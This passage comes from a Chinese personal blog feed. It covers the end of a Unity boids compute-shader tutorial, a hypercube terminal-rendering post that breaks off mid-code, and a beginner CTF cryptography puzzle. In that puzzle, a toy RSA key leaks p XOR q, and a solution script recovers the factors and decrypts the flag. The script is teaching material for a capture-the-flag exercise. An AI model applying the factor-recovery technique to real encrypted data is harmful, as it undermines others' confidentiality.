c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> boidData = <span class="keyword">new</span> BoidData[boids.Length];</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; boids.Length; i++) &#123;</span><br><span class="line">    boidData[i].position = boids[i].transform.position;</span><br><span class="line">    boidData[i].forward = boids[i].transform.forward;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> boidBuffer = <span class="keyword">new</span> ComputeBuffer (boids.Length, BoidData.Size);</span><br><span class="line">boidBuffer.SetData (boidData);</span><br></pre></td></tr></table></figure></li><li><p>传入ComputeShader计算需要的变量信息</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">computeShader.SetBuffer(<span class="number">0</span>, <span class="string">&quot;boids&quot;</span>, boidBuffer);</span><br><span class="line">computeShader.SetInt(<span class="string">&quot;numBoids&quot;</span>, boids.Length);</span><br><span class="line">computeShader.SetFloat(<span class="string">&quot;viewRadius&quot;</span>, viewRadius);</span><br><span class="line">computeShader.SetFloat(<span class="string">&quot;avoidRadius&quot;</span>, avoidRadius);</span><br><span class="line">computeShader.SetFloat(<span class="string">&quot;avoidWeight&quot;</span>, avoidWeight);</span><br><span class="line">computeShader.SetFloat(<span class="string">&quot;headingWeight&quot;</span>, headingWeight);</span><br><span class="line">computeShader.SetFloat(<span class="string">&quot;centerWeight&quot;</span>, centerWeight);</span><br></pre></td></tr></table></figure></li><li><p>通过<code>Dispatch()</code>开始执行ComputeShader</p><p>  <code>computeShader.Dispatch(0, threadGroups, 1, 1);</code></p></li></ul><p>现在把视角切换到ComputeShader上</p><ul><li><p>把需要传入的变量都定义一遍，这里注意结构体使用了<code>RWStructuredBuffer</code>作为容器</p><blockquote><p>A structured buffer is a buffer that contains elements of equal sizes. Use a structure with one or more member types to define an element. Here is a structure with three members.</p></blockquote>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">struct Boid &#123;</span><br><span class="line">    float3 position;</span><br><span class="line">    float3 forward;</span><br><span class="line">    float3 acceleration;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">RWStructuredBuffer&lt;Boid&gt; boids;</span><br><span class="line">int numBoids;</span><br><span class="line">float viewRadius;</span><br><span class="line">float avoidRadius;</span><br><span class="line">float avoidWeight;</span><br><span class="line">float headingWeight;</span><br><span class="line">float centerWeight;</span><br></pre></td></tr></table></figure></li><li><p>翻译一遍C#代码，只需要改一点语法就可以了</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">void CSMain (uint3 id : SV_DispatchThreadID)</span><br><span class="line">&#123;</span><br><span class="line">    float3 zero3 &#x3D; &#123;0, 0, 0&#125;;</span><br><span class="line">    float3 avoidAcceleration &#x3D; zero3;</span><br><span class="line">    float3 headingAcceleration &#x3D; zero3;</span><br><span class="line">    float3 centerAcceleration &#x3D; zero3;</span><br><span class="line">    int mateCount;</span><br><span class="line">    int avoidCount;</span><br><span class="line">    for(int i &#x3D; 0; i &lt; numBoids; i ++)&#123;</span><br><span class="line">        if((int)id.x !&#x3D; i)&#123;</span><br><span class="line">            float3 offset &#x3D; boids[id.x].position - boids[i].position;</span><br><span class="line">            float sqrDst &#x3D; offset.x * offset.x + offset.y * offset.y + offset.z * offset.z;</span><br><span class="line">            if(sqrDst &lt; viewRadius * viewRadius)&#123;</span><br><span class="line">                mateCount +&#x3D; 1;</span><br><span class="line">                headingAcceleration +&#x3D; boids[i].forward - boids[id.x].forward;</span><br><span class="line">                centerAcceleration -&#x3D; offset;</span><br><span class="line">            &#125;</span><br><span class="line">            if(sqrDst &lt; avoidRadius * avoidRadius)&#123;</span><br><span class="line">                avoidCount++;</span><br><span class="line">                avoidAcceleration +&#x3D; normalize(offset) &#x2F; sqrDst;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    avoidAcceleration &#x3D; avoidCount &#x3D;&#x3D; 0 ? zero3 : normalize(avoidAcceleration);</span><br><span class="line">    headingAcceleration &#x3D; mateCount &#x3D;&#x3D; 0 ? zero3 : normalize(headingAcceleration);</span><br><span class="line">    centerAcceleration &#x3D; mateCount &#x3D;&#x3D; 0 ? zero3 : normalize(centerAcceleration);</span><br><span class="line">    boids[id.x].acceleration &#x3D; avoidAcceleration * avoidWeight + headingAcceleration * headingWeight + centerAcceleration * centerWeight;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>关于<code>numthread</code>，示例工程直接设了<code>[1024,1,1]</code>：使用一维向量是因为需要处理的数据没有类似材质、体积之类的三维结构体；<code>1024</code>是为了直接把线程拉满</p><h3 id="Result-2"><a href="#Result-2" class="headerlink" title="Result"></a>Result</h3><p>将原本在CPU中进行的大量重复计算迁移至GPU后可模拟的鱼群规模瞬间提升了不少，现在你可以模拟一些较大规模的鱼群了，在此就不附新的图片了</p><h2 id="Polish"><a href="#Polish" class="headerlink" title="Polish"></a>Polish</h2><p>就算为其换上一个真正的鱼🐟的模型，现在的鱼群整体还比较单调，虽然有了一些规则使得其在宏观动态的表现力上有了那么一捏捏，但还缺少一些更加直观的细节，说白了就是有一个有趣的灵魂但没有华丽的外表，所以我们不妨做两个shader来为其润色，一个shader负责鱼的摆动，另一个负责水面材质</p><p>我使用的是HDRP作为渲染管线，虽然我不会用它，但我听说他很强，所以我希望能迈出第一步</p><p>由于目前使用的是ShaderGraph，不便于附代码，只能讲一下思路并附带一些资料了</p><h3 id="Waving-Fish"><a href="#Waving-Fish" class="headerlink" title="Waving Fish"></a>Waving Fish</h3><p>其实可以用一个<code>sin(t)</code>函数就能获得很能接受的效果了，但是鉴于鱼都是成群出现，以时间为变量的函数肯定是不行的，我当前的做法是将鱼的世界坐标作为变量，输入到<code>Gradient Noise</code>，对鱼的顶点坐标的某一个轴向应用这个噪声，这样得到的鱼会根据自身位置而决定摇摆，缺点是没有和鱼的转向、运动等联系起来，在设想中，能根自身加速度选择摇摆方式的Shader才是最好的，但目前不清楚这样做的可行性以及具体方法</p><p>接下来还需要将鱼头的摇摆幅度降低，因为一般来说鱼头不会像尾巴和身体那样剧烈摆动。在此推荐了解一下有关<code>UV</code>的概念，这很重要，比如此处可以将UV的x作为变量，在噪声和原本的顶点位置之间做线性插值(LERP)，也可以对UV.x取平方之类的以让摆动的过度更加自然</p><p>综上，便得到了一条欢快的小鱼🐟</p><p><img src="/images/Boid_WavingFish.gif"></p><h3 id="Water-Surface-Shader"><a href="#Water-Surface-Shader" class="headerlink" title="Water Surface Shader"></a>Water Surface Shader</h3><p>鱼得到了升级，还需要一个容器来使得整个场景在水中，这里选择制作一个水面的材质贴在平面上，做成开头那样的水立方，Unity官方提供了 <a href="https://www.youtube.com/watch?v=gRq-IdShxpU">基本的水面ShdaerGraph教程</a>，由于处处碰壁，我也就基本是抄了一遍官方的成果</p><p>主要的思想是使<code>Scene Depth</code>与<code>Screen Position</code>相减，由于前者的检测不包含透明物体，而后者包含，则可以获取穿过一个透明平面后的空间深度信息</p><img src="/images/Boid_Depth.png" alt="Boid_Depth" style="zoom: 67%;" /><p>之后只需要在这个平面的表面做两层不同细节程度的水面Normal Map的反向滚动，再加入由噪声控制的平面顶点坐标的起伏即可</p><h2 id="Final-Result"><a href="#Final-Result" class="headerlink" title="Final Result"></a>Final Result</h2><p>Check the final result if you want, a gif about 10 Mb</p><p><img src="/images/Boid_Final.gif"></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Unity </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浪潮俱乐部密码免试题</title>
      <link href="2021/09/14/%E6%B5%AA%E6%BD%AE%E4%BF%B1%E4%B9%90%E9%83%A8%E5%AF%86%E7%A0%81%E5%85%8D%E8%AF%95%E9%A2%98/"/>
      <url>2021/09/14/%E6%B5%AA%E6%BD%AE%E4%BF%B1%E4%B9%90%E9%83%A8%E5%AF%86%E7%A0%81%E5%85%8D%E8%AF%95%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>一个面向新人的简单密码题</p><span id="more"></span><h1 id="浪潮俱乐部密码免试题"><a href="#浪潮俱乐部密码免试题" class="headerlink" title="浪潮俱乐部密码免试题"></a>浪潮俱乐部密码免试题</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">bit=<span class="number">128</span></span><br><span class="line">p = getPrime(bit)</span><br><span class="line">q = getPrime(bit)</span><br><span class="line">n = p*q</span><br><span class="line">xor = p^q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">print(<span class="built_in">pow</span>(bytes_to_long(flag),e,n))</span><br><span class="line">print(n)</span><br><span class="line">print(xor)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">57928739525594987887296575374030551510625601525690046551520041216593791573788</span></span><br><span class="line"><span class="string">80432855143052017312586077102716651699179063179625801734127439450003104378453</span></span><br><span class="line"><span class="string">57489605936489517513414513696072421348</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># Hint: 二叉树与二进制</span></span><br></pre></td></tr></table></figure><div class='spoiler collapsed'>    <div class='spoiler-title'>        exp    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n=<span class="string">&#x27;1011000111010011011000011111101000100011101111000010000100001000011101000101010010101110001010111000000001110000110100000101010010001110010100000101001111000010101100000000101111010001100000001000001011110011110111000000111101010101111100001010111001010101&#x27;</span></span><br><span class="line">xor=<span class="string">&#x27;00101011010000000001100001101001010001110001100110010011010010001011110100111000100110000111101110111010011100100100111111100100&#x27;</span></span><br><span class="line">count=<span class="number">0</span></span><br><span class="line">att=<span class="number">0</span></span><br><span class="line">qq=[]</span><br><span class="line">pp=[]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">q,p,index</span>):</span></span><br><span class="line">    <span class="keyword">global</span> count</span><br><span class="line">    <span class="keyword">if</span> index&gt;<span class="number">128</span>:</span><br><span class="line">        <span class="keyword">if</span> q <span class="keyword">not</span> <span class="keyword">in</span> qq <span class="keyword">and</span> q <span class="keyword">not</span> <span class="keyword">in</span> pp:</span><br><span class="line">            <span class="comment">#print(&#x27;q&#x27;,q,&#x27;p&#x27;,p)</span></span><br><span class="line">            qq.append(q)</span><br><span class="line">            pp.append(p)</span><br><span class="line">            count+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">global</span> xor</span><br><span class="line">    i=xor[-index]</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="string">&#x27;1&#x27;</span>+q,<span class="number">2</span>)*<span class="built_in">int</span>(<span class="string">&#x27;1&#x27;</span>+p,<span class="number">2</span>))[-index:]==n[-index:]:</span><br><span class="line">            f(<span class="string">&#x27;1&#x27;</span>+q,<span class="string">&#x27;1&#x27;</span>+p,index+<span class="number">1</span>)</span><br><span class="line">        zeroResult = <span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="string">&#x27;0&#x27;</span>+q,<span class="number">2</span>)*<span class="built_in">int</span>(<span class="string">&#x27;0&#x27;</span>+p,<span class="number">2</span>))[-index:]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;b&#x27;</span> <span class="keyword">in</span> zeroResult:</span><br><span class="line">            zeroResult = <span class="string">&#x27;0&#x27;</span> + zeroResult[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> zeroResult==n[-index:]:</span><br><span class="line">            f(<span class="string">&#x27;0&#x27;</span>+q,<span class="string">&#x27;0&#x27;</span>+p,index+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="string">&#x27;1&#x27;</span>+q,<span class="number">2</span>)*<span class="built_in">int</span>(<span class="string">&#x27;0&#x27;</span>+p,<span class="number">2</span>))[-index:]==n[-index:]:</span><br><span class="line">            f(<span class="string">&#x27;1&#x27;</span>+q,<span class="string">&#x27;0&#x27;</span>+p,index+<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="string">&#x27;0&#x27;</span>+q,<span class="number">2</span>)*<span class="built_in">int</span>(<span class="string">&#x27;1&#x27;</span>+p,<span class="number">2</span>))[-index:]==n[-index:]:</span><br><span class="line">            f(<span class="string">&#x27;0&#x27;</span>+q,<span class="string">&#x27;1&#x27;</span>+p,index+<span class="number">1</span>)</span><br><span class="line">f(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">print(count)</span><br><span class="line">n = <span class="built_in">int</span>(n,<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(pp[i],<span class="number">2</span>)*<span class="built_in">int</span>(qq[i],<span class="number">2</span>)==n:</span><br><span class="line">        phi=(<span class="built_in">int</span>(pp[i],<span class="number">2</span>)-<span class="number">1</span>)*(<span class="built_in">int</span>(qq[i],<span class="number">2</span>)-<span class="number">1</span>)</span><br><span class="line">        e=<span class="number">65537</span></span><br><span class="line">        c=<span class="number">57928739525594987887296575374030551510625601525690046551520041216593791573788</span></span><br><span class="line">        d =inverse(e,phi)</span><br><span class="line">        print(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br></pre></td></tr></table></figure>    </div></div><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Crypyto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello Dimension</title>
      <link href="2021/04/24/Hello_Dimension/"/>
      <url>2021/04/24/Hello_Dimension/</url>
      
        <content type="html"><![CDATA[<p>Meet Hypercubes~ O(∩_∩)O</p><p>🦎语言渲染n维立方体至终端，那真是非常amazing啊</p><img src="/images/4Hypercube-transparent.gif" height="200" width="200" /><span id="more"></span><h1 id="Hello-Dimension"><a href="#Hello-Dimension" class="headerlink" title="Hello Dimension"></a>Hello Dimension</h1><p align="right"><small>So all this just to render a cube on your terminal ?</small></p><blockquote><p>后来做成工程概论大作业的<a href="https://kyriota.com/html/hypercube/">网页版本</a>(手机慎点)，使用了<code>threejs</code>这个图形库来绘制和打光，比起控制台来说虽然不那么geek，但是稍微更直观那么亿点，应该还存在一些bug，但是3，4，5维下应该是没什么问题</p></blockquote><p>封面gif为超立方体绕xw与xz轴的旋转，至于结果的正确性，我参照了wiki且自认为无误，例如下图就是一些与超立方体相关的图片</p><center><table>    <tr>        <td ><center><img src="/images/HypercubeStructure.gif" width=200 height=200>超立方体解构</center></td>        <td ><center><img src="/images/wikiHypercube.gif" width=200 height=200>超立方体绕xw轴旋转</center></td>    </tr></table></center>不妨先来看看我的代码都渲染出了些什么：<table><thead><tr><th>图像</th><th>说明</th></tr></thead><tbody><tr><td><img src="/images/4HypercubeOpen.gif" width=500 height=500></td><td>此为在<a href="https://kyriota.com/2021/04/19/%E5%9B%BE%E5%BD%A2%E5%AD%A6HelloWorld/">图形学HelloWorld</a>基础上修改的代码，限于模型生成原理与渲染原理写的稀烂而无法拓展到更高的五维，且由于法向量并非实时计算而是手动设置，导致旋转时的”四维面“渲染错误（就是gif中看见明显是个正方体但是却没有正确的打光的一坨吞过来吐回去的东西）</td></tr><tr><td><img src="/images/4Hypercube.gif" width=500 height=500></td><td>后来对模型生成原理与渲染原理大改，引入顶点模型并实时计算法向量，正确渲染出了这个超立方体</td></tr><tr><td><img src="/images/5Hypercube.gif" width=500 height=500></td><td>在四维升五维时又出现了代码通用性的问题，发现五维时存在多处三角形的各顶点几乎位于同一直线的情况，对判断质心与直线关系的方程引入一个很小的Δoffest解决此问题</td></tr></tbody></table><p>最后写了透明材质，为了方便和实际效果没有对透明材质计算光照，透明物体代码比不透明的简单，但确实便利了理解内部结构变化</p><center><table>    <tr>        <td ><center><img src="/images/4Hypercube-transparent.gif" width=200 height=200>透明四维 </center></td>        <td ><center><img src="/images/5Hypercube-transparent.gif" width=200 height=200>透明五维</center></td>    </tr></table></center><div class='spoiler collapsed'>    <div class='spoiler-title'>        对渲染与模型的改进大纲    </div>    <div class='spoiler-content'>        <ul><li><p>三角形：先前的正方体和球体模型都是实际存在于数组中的非常多的点，每个点与屏幕上的点对应，不仅空间占用多，算力跟不上，法向量也是针对正方体和球体的几何性质为其手动安排的，缺乏普适性</p><ul><li>解决：对于正方体，只需要求出正方体的顶点以及顶点之间的位置关系（哪些顶点相邻），即可由此推得三角形、四棱锥等独立的局部图形，这带来的好处有：<ul><li>普适性增强，即使物体不是正方体也能以此方式计算、渲染</li><li>性能提升，维度得以升的更高，计算速度快了亿点点</li><li>可以通过计算局部质心准确区分内外法向量，但是此处的正方体是凸几何体，直接以原点（正方体质心）区分内外法向量也是足够的</li></ul></li></ul></li><li><p>内外法向量：现有一模型的相邻三点确定的平面ABC，如何区分内外法向量？</p><ul><li><p>解决：因为我面对的对象是正方体，所以只要对任意顶点向量加上法向量，将作此偏移后的向量与其对应顶点向量比较模长大小，即可判断内外法向量</p><img src="/images/HelloDimension_外法向量.jpg" width=200 height=200><p>但这样会在凹几何体上有误</p><img src="/images/HelloDimension_全局质心.jpg" width=200 height=200><p>所以普适的做法应是再寻找一个相邻顶点，确定一个四面体，计算此四面体质心，然后以此质心为基准作同样的偏移后的模长比较</p></li></ul></li><li><p>透视投影：人眼观察物体是小孔成像，透视投影，正投影会缺少近大远小的特征，且只有在降维时透视投影才能使高维几何体投影出令人满意的效果（否则就是黏成一坨扭来扭曲，没有大小变化），透视投影的投影矩阵通过一个相似三角形就出来了，点到为止</p></li><li><p>半透明材质：就简不就繁，再精致的透明材质在终端也看不出来，我的做法是不再计算法向量，发现投影到屏幕上的面有几个，该点的alpha就加到几，然后应用下面这个式子把alpha换回 [0,1) 内（整个幂主要是想让曲线平滑一点，去掉也可以）</p>  <center><code>alpha=1-1/(k*alpha+1)^3/2</code></center></li></ul>    </div></div><p>以下是最终的源码，重要参数全部在define或全局变量中</p><blockquote><p>后记：突然发现有一处用了<code>public</code>做了变量名/捂脸，但是C语言没有class，所以那里的public是指模型的公共顶点</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> a 8.0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pi 3.1415926</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> size 55</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> delta 0.5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> deltaA 0.02</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> eOffest 0.001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dimension 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> transparent 0.6</span></span><br><span class="line"><span class="keyword">char</span> shade[]=<span class="string">&quot;.,:;!om0&amp;%@&quot;</span>;</span><br><span class="line"><span class="keyword">float</span> lightSrcDis=<span class="number">5</span>*a;</span><br><span class="line"><span class="keyword">float</span> light[<span class="number">3</span>]=&#123;<span class="number">-2</span>,<span class="number">5</span>,<span class="number">0.8</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> rotateAround[]=&#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">2</span>&#125;;</span><br><span class="line"><span class="keyword">float</span> vAxis[]     =&#123; <span class="number">3</span> , <span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">float</span> initialCam[<span class="number">3</span>]=&#123;<span class="number">0</span>,pi*<span class="number">5</span>/<span class="number">24</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">calLength</span><span class="params">(<span class="keyword">float</span> *vec,<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> result=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++) result+=vec[i]*vec[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sqrt</span>(result);&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> lightLength=calLength(&amp;light[<span class="number">0</span>],<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) light[i]/=lightLength;</span><br><span class="line">    <span class="keyword">float</span> out_f[size][size],dis[size][size]=&#123;(<span class="keyword">float</span>)<span class="number">4</span>*size&#125;;</span><br><span class="line">    <span class="keyword">float</span> move=(size<span class="number">-1</span>)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> face=((<span class="keyword">int</span>)(<span class="built_in">pow</span>(<span class="number">2</span>,dimension<span class="number">-3</span>)*dimension*(dimension<span class="number">-1</span>)));</span><br><span class="line">    <span class="keyword">int</span> vexNum=(<span class="keyword">int</span>)(<span class="built_in">pow</span>(<span class="number">2</span>,dimension))*dimension;</span><br><span class="line">    <span class="keyword">int</span> vexLink[vexNum],normalLink[<span class="number">6</span>*face];</span><br><span class="line">    <span class="keyword">float</span> vex[vexNum],vexO[vexNum],vexProjected[vexNum],vexTemp[vexNum];</span><br><span class="line">    <span class="keyword">float</span> normalResultSet[<span class="number">6</span>*face];</span><br><span class="line">    <span class="built_in">memset</span>(vexLink,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(vexLink));</span><br><span class="line">    <span class="built_in">memset</span>(normalLink,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(normalLink));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;vexNum;i++) vex[i]=a;</span><br><span class="line">    vex[dimension]=-a;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">2</span>,difference,sign,i;vexIndex*dimension&lt;vexNum;vexIndex++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(sign=<span class="number">0</span>;sign&lt;dimension;sign++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;vexIndex<span class="number">-1</span>;i++)&#123;difference=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension&amp;&amp;!difference;k++)</span><br><span class="line">                    <span class="keyword">if</span>(sign==k?vex[i*dimension+k]!=<span class="number">-1</span>*vex[(vexIndex<span class="number">-1</span>)*dimension+k]:vex[i*dimension+k]!=vex[(vexIndex<span class="number">-1</span>)*dimension+k]) difference=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(!difference) <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="keyword">if</span>(difference) <span class="keyword">break</span>;</span><br><span class="line">        &#125;<span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension;k++) 